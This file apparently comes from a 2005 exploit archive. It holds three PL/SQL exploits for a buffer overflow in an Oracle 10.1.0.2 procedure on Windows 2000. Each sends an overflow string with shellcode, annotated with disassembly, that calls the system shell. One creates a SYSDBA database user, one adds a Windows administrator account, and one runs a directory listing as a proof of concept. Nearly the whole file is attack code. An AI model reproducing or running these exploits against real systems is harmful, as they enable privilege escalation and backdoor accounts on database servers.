/*
Advanced SQL Injection in Oracle databases

Exploit for the buffer overflow vulnerability in procedure MDSYS.MD2.SDO_CODE_SIZE
of Oracle Database Server version 10.1.0.2 under Windows 2000 Server SP4.
Fixes available at http://metalink.oracle.com.

The exploit creates a SYSDBA user ERIC with a password 'MYPSW12'

By Esteban Martinez Fayo
secemf@gmail.com
*/

DECLARE
a BINARY_INTEGER; -- return value
AAA VARCHAR2(32767);
BEGIN
AAA := 'AAAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDDDDDDDDEEEEEEEE
EEEEEEEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGG
GGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH'
|| CHR(131) || CHR(195) || CHR(9) || CHR(255) || CHR(227)
/*
83C3 09 ADD EBX,9
FFE3 JMP EBX
*/
|| CHR(251) || CHR(90) || CHR (227) || CHR(120) -- Jump to address 0x78E35AFB
/*
userenv.dll
78E35AFB 4B DEC EBX
78E35AFC FFD3 CALL EBX
*/
|| CHR(54) || CHR(141) || CHR(67) || CHR(19) || CHR(80) || chr(184) || chr(191) || 
chr(142) || chr(01) || chr(120) || chr(255) || chr(208) || chr(184) || chr(147) || 
chr(131) || chr(00) || chr(120) || chr(255) || chr(208)
/*
36:8D43 13 LEA EAX,DWORD PTR SS:[EBX+13]
50 PUSH EAX
B8 BF8E0178 MOV EAX,MSVCRT.system
FFD0 CALL EAX
B8 93830078 MOV EAX,MSVCRT._endthread
FFD0 CALL EAX
*/
|| 'echo CREATE USER ERIC IDENTIFIED BY MYPSW12; > c:\cu.sql'||chr(38)||'
echo GRANT DBA TO ERIC; >> c:\cu.sql '||chr(38)||' echo ALTER USER ERIC DEFAULT ROLE DBA; 
>> c:\cu.sql '||chr(38)||' echo GRANT SYSDBA TO "ERIC" WITH ADMIN OPTION; >> 
c:\cu.sql'||chr(38)||'echo QUIT >> c:\cu.sql '||chr(38)||' 
c:\oracle\product\10.1.0\db_1\bin\sqlplus.exe "/ as sysdba" @c:\cu.sql 1> 
c:\stdout.log 2> c:\stderr.log';
a := MDSYS.MD2.SDO_CODE_SIZE (LAYER => AAA);
END;

--------------------------------------------------------------------------------------------------------

/*
Advanced SQL Injection in Oracle databases

Exploit for the buffer overflow vulnerability in procedure MDSYS.MD2.SDO_CODE_SIZE
of Oracle Database Server version 10.1.0.2 under Windows 2000 Server SP4.
Fixes available at http://metalink.oracle.com.

The exploit creates a Windows user ERIC with Administrator privilege.

By Esteban Martinez Fayo
secemf@gmail.com
*/

DECLARE
a BINARY_INTEGER; -- return value
AAA VARCHAR2(32767);
BEGIN
AAA := 'AAAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDDDDDDDDEEEEEEEE
EEEEEEEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGG
GGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH'
|| CHR(131) || CHR(195) || CHR(9) || CHR(255) || CHR(227)
/*
83C3 09 ADD EBX,9
FFE3 JMP EBX
*/
|| CHR(251) || CHR(90) || CHR (227) || CHR(120) -- Jump to address 0x78E35AFB
/*
userenv.dll
78E35AFB 4B DEC EBX
78E35AFC FFD3 CALL EBX
*/
|| CHR(54) || CHR(141) || CHR(67) || CHR(19) || CHR(80) || chr(184) || chr(191) 
|| chr(142) || chr(01) || chr(120) || chr(255) || chr(208) || chr(184) || chr(147) 
|| chr(131) || chr(00) || chr(120) || chr(255) || chr(208)
/*
36:8D43 13 LEA EAX,DWORD PTR SS:[EBX+13]
50 PUSH EAX
B8 BF8E0178 MOV EAX,MSVCRT.system
FFD0 CALL EAX
B8 93830078 MOV EAX,MSVCRT._endthread
FFD0 CALL EAX
*/
|| 'net user admin2 /add '||chr(38)||' net localgroup Administradores
admin2 /add '||chr(38)||' net localgroup ORA_DBA admin2 /add';
a := MDSYS.MD2.SDO_CODE_SIZE (LAYER => AAA);
end;

--------------------------------------------------------------------------------------------------------

/*
Advanced SQL Injection in Oracle databases

Proof of concept exploit for the buffer overflow vulnerability in procedure MDSYS.MD2.SDO_CODE_SIZE
of Oracle Database Server version 10.1.0.2 under Windows 2000 Server SP4.
Fixes available at http://metalink.oracle.com.

By Esteban Martinez Fayo
secemf@gmail.com
*/

DECLARE
a BINARY_INTEGER; -- return value
AAA VARCHAR2(32767);
BEGIN
AAA := 'AAAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDDDDDDDDEEEEEEEE
EEEEEEEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGG
GGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH'
|| CHR(131) || CHR(195) || CHR(9) || CHR(255) || CHR(227)
/*
83C3 09 ADD EBX,9
FFE3 JMP EBX
*/
|| CHR(251) || CHR(90) || CHR (227) || CHR(120) -- Jump to address 0x78E35AFB
/*
userenv.dll
78E35AFB 4B DEC EBX
78E35AFC FFD3 CALL EBX
*/
|| CHR(54) || CHR(141) || CHR(67) || CHR(19) || CHR(80) || chr(184) || chr(191) || chr(142) 
|| chr(01) || chr(120) || chr(255) || chr(208) || chr(184) || chr(147) || chr(131) || 
chr(00) || chr(120) || chr(255) || chr(208)
/*
36:8D43 13 LEA EAX,DWORD PTR SS:[EBX+13]
50 PUSH EAX
B8 BF8E0178 MOV EAX,MSVCRT.system
FFD0 CALL EAX
B8 93830078 MOV EAX,MSVCRT._endthread
FFD0 CALL EAX
*/
|| 'dir>c:\dir.txt'; -- OS command to execute
a := MDSYS.MD2.SDO_CODE_SIZE (LAYER => AAA);
END;

// milw0rm.com [2005-04-13]
